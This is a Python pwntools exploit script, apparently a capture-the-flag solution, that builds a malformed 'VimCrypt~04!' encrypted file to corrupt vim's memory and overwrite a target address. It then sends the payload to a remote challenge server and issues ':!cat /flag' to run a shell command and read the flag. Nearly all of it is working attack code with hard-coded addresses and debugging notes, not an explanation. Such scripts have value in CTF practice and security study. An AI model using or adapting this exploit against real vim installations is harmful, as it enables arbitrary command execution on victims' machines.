from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "vim"



def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

#elf = ELF (bin_name);
#context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
#
context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'
'''
0x9286b8:	0x00000031	0x00000000	0x00000061	0x00000061
0x9286c8:	0xffffffff	0x00000064	0x00000065	0x00000000
0x9286d8:	0x00928760	0x00000000	0x00000000	0x00000000
0x9286e8:	0x00000071	0x00000000	0x9effffff	0x00000000
0x9286f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x928708:	0x00000000	0x00000000	0x00000000	0x00000000
'''

header = 'VimCrypt~04!'

key = ord('a')
step = 0xffffffff
iv = p32(step ^ key, endian='big')

target = 0x8A8139  # exit .got.plt
target = 0x8d5d80
#target = 0x8a831a

payload = '\x00'
payload += p64(0) + p32(0x31, endian='big') + p64(0)
payload += p64(target, endian='big')

payload += '\xff' *3

target_len = len(payload)
shift = key % target_len

print 'shift: %d' % shift
print 'len: %d' % target_len

payload = header + iv + payload

with open('payload', 'wb') as f:
    f.write(payload)

'''
break crypt_perm_decode
break *0x4148BC
break *0x41492F
break *0x41495B
x/40wx 0x9286f0-0x38
'''

if True:
      p = remote('bincat.kr', 10001) #docker link

      p.recvuntil('OK\n')
      p.sendline(str(len(payload)))
      p.send(payload)

      p.sendline (":!cat /flag")
      p.interactive()
